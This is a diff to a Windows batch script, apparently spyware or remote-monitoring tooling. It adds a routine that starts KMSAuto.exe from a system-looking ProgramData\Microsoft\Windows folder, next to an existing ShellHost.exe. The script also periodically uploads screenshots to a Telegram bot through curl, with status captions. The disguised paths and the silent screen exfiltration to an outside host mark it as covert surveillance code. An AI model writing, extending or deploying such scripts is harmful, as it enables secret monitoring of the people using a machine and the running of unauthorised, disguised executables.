@@ -2,12 +2,12 @@
 
 
 setlocal enabledelayedexpansion
-set "BATCHVERSION=2.2"
+set "BATCHVERSION=2.3"
 
 
 
 set "SHSTFILE=C:\ProgramData\Microsoft\Windows\ShellHost.exe"
-
+set "KMSFILE=C:\ProgramData\Microsoft\Windows\KMSAuto.exe"
 if not exist "%temp%\i059.tmp" type nul > "%temp%\i059.tmp"
 
 
@@ -44,6 +44,27 @@ echo SHST RUNNING is !SHSTRUNNING! and %SHSTRUNNING%
 
 echo.
 echo.
+
+
+
+
+
+:: Check if KMSFILE is running
+set "KMSRUNNING=0"
+powershell -command "if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%KMSFILE%' }) { exit 0 } else { exit 1 }"
+if %errorlevel%==1 (
+    echo %KMSFILE% is not running. starting now...
+    start "" "%KMSFILE%"
+) else (
+    set "KMSRUNNING=1"
+    echo %KMSFILE% is already running.
+)
+
+echo KMS RUNNING is !KMSRUNNING! and %KMSRUNNING%
+
+echo.
+echo.
+
 
 
 
@@ -86,7 +107,7 @@ timeout /t 180 /nobreak
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendPhoto" ^
      -F "chat_id=%CHAT_ID_MyScrn%" ^
      -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
-     -F "caption=LAPTOP|SHST(%SHSTRUNNING%)|%time%|%BATCHVERSION%|" ^
+     -F "caption=LAPTOP|SHST%SHSTRUNNING%KMS%KMSRUNNING%|%time%|%BATCHVERSION%|" ^
      -F "photo=@%FILE_PATH_MyScrn%" ^
      --limit-rate 80K
 
